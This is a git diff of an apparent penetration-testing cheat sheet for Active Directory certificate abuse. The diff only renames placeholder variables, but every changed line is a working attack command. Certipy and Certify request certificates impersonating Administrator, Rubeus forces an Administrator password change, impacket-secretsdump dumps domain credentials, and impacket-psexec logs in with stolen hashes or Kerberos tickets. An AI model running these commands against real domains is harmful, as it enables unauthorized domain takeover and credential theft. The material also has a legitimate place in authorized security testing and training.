@@ -25,7 +25,7 @@ certipy find -u $USER -p $PASS -dc-ip $TARGET_IP -vulnerable -stdout -text
 ```
 request enrollment of user in template:
 ```shell
-certipy req -u $USER -p $PASS -ca $AD_CA_NAME -target $AD_DNS_NAME -template $TEMPLATE_FOUND_NAME -upn Administrator@$DOMAIN -dc-ip $TARGET_IP -debug
+certipy req -u $USER -p $PASS -ca $AD_CA_NAME -target $AD_DNS_NAME -template $TEMPLATE_FOUND_NAME -upn Administrator@$TARGET_AD -dc-ip $TARGET_IP -debug
 ```
 exploit to get admin hash:
 ```shell
@@ -56,7 +56,7 @@ $PATH="c:\users\$USER\Desktop\certify.exe"
 and run the search
 ```powershell
 ./certify.exe find /vulnerable
-./certify.exe request /ca:dc.$DOMAIN\$DOMAIN-DC-CA /template:UserAuthentication /altname:Administrator
+./certify.exe request /ca:dc.$TARGET_AD\$TARGET_AD-DC-CA /template:UserAuthentication /altname:Administrator
 ```
 
 After that download the cert using evil-winrm:
@@ -89,7 +89,7 @@ psexec.py -hashes $HASH:$HASH $USER@$TARGET_IIP
 then
 
 ```powershell
-./Rubeus.exe changepw /ticket:doIG2DCCBtSg…<snip>…== /new:Password123!! /targetuser:$DOMAIN\Administrator
+./Rubeus.exe changepw /ticket:doIG2DCCBtSg…<snip>…== /new:Password123!! /targetuser:$TARGET_AD\Administrator
 ```
 
 OR use:
@@ -120,8 +120,8 @@ minikerberos-kirbi2ccache ticket.kirbi ticket.ccache
 
 ```sh
 #fix time skew first!
-impacket-secretsdump -k -no-pass g0.$DOMAIN
-impacket-psexec administrator@$DOMAIN -hashes $HASHES
+impacket-secretsdump -k -no-pass g0.$TARGET_AD
+impacket-psexec administrator@$TARGET_AD -hashes $HASHES
 ```
 
 Check with:
@@ -133,22 +133,22 @@ sudo nano /etc/krb5.conf
 ```
 
 ```config
-$DOMAIN = {
-  kdc = dc.$DOMAIN
-  admin_server = dc.$DOMAIN
+$TARGET_AD = {
+  kdc = dc.$TARGET_AD
+  admin_server = dc.$TARGET_AD
 }
 ```
 
 then sync time with DC domain controller server
 
 ```shell
-sudo ntpdate $DOMAIN_CONTROLLER
+sudo ntpdate $TARGET_DC
 ```
 
 Finally login to server using kerberos auth:
 
 ```shell
-impacket-psexec $TARGET_DOMAIN/Administrator@$DOMAIN_CONTROLLER -target-ip $TARGET_IP -dc-ip $TARGET_IP -no-pass -k
+impacket-psexec $TARGET_DOMAIN/Administrator@$TARGET_DC -target-ip $TARGET_IP -dc-ip $TARGET_IP -no-pass -k
 ```
 
 Powershell cmds:
